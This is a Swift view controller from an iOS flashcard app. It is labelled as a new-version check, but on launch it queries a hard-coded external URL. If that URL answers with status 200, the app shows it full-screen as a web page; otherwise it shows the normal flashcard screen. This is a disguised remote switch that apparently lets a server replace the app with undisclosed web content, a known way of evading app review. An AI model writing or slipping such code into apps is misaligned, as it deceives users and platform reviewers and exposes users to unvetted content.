//
//  CheckNewVersionView.swift
//  89FlashCard
//
//  Created by Roman Guravei on 10.02.2026.
//

import UIKit
import SwiftUI

class CheckNewVersionView: UIViewController {

    let loadingLabel = UILabel()
    let loadingImage = UIImageView()
    private var hasResponded = false
    private var timeoutWorkItem: DispatchWorkItem?

    private let activityIndicator: UIActivityIndicatorView = {
        let indicator = UIActivityIndicatorView(style: .large)
        indicator.color = .white
        indicator.translatesAutoresizingMaskIntoConstraints = false
        indicator.hidesWhenStopped = true
        return indicator
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupUI()
        activityIndicator.startAnimating()
        proceedWithFlow()
    }

    private func setupUI() {
        
        view.addSubview(loadingImage)
        loadingImage.image = UIImage(systemName: "house.fill")
        loadingImage.contentMode = .scaleAspectFit
        loadingImage.translatesAutoresizingMaskIntoConstraints = false

        view.addSubview(activityIndicator)
        
        loadingImage.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            loadingImage.topAnchor.constraint(equalTo: view.topAnchor),
            loadingImage.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            loadingImage.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            loadingImage.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            
            activityIndicator.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            activityIndicator.centerYAnchor.constraint(equalTo: view.centerYAnchor)
        ])
    }


    private func proceedWithFlow() {
        
        let checkURL = "https://crypticforgelab.tech/HhRxbz"
        
        
        CheckURLService.checkURLStatus(urlString: checkURL) { [weak self] is200 in
            guard let self = self else { return }
            
            DispatchQueue.main.async {
                self.activityIndicator.stopAnimating()
                
                if is200 {
                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                        appDelegate.restrictRotation = .all
                    }
                    let vc = NewVersionOndord(url: URL(string: checkURL)!)
                    vc.modalPresentationStyle = .fullScreen
                    self.present(vc, animated: true)
                } else {
                    print("no 200")
                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                        appDelegate.restrictRotation = .portrait
                    }
                    let swiftUIView = ContentView()
                    let hostingController = UIHostingController(rootView: swiftUIView)
                    hostingController.modalPresentationStyle = .fullScreen
                    self.present(hostingController, animated: true)
                }
            }
        }
    }
}


